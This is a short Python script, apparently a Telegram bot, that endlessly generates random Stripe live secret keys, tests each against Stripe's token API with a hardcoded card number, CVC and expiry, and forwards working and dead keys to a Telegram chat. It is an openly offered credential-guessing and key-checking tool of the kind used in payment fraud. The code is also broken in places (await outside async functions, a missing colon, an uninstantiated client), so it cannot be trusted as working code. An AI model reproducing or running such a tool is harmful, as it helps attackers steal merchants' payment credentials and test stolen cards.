import requests, random, string, os, asyncio,logging 
from pyrogram import Client, filters

log = logging.getLogger(__name__)

chatid = os.environ.get("FORWARD_ID")
    

def checksk(type):
    if type=="short":
       skkey = "sk_live_"+''.join(random.choices( string.digits + string.ascii_letters, k = 24))
    else:
      skkey = random.choice(['sk_live_51H', 'sk_live_51J'])+''.join(random.choices( string.digits + string.ascii_letters, k = 96))
    validate(skkey)


def validate(skkey):
    pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2023'}, auth=(skkey, ""))
    if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
      log.error(f"DEAD > {skkey}")
      return await Client.send_message(chat_id=chatid,text=f"Ded Sk 💖\n{skkey}")

    else:
      log.info(f"LIVE > {skkey}")
      return await Client.send_message(chat_id=chatid,text=f"Live Sk 💖\n{skkey}")

async def backgen()
    while True:
      checksk("long")
      # await asyncio.sleep(0.2)
      checksk("short")
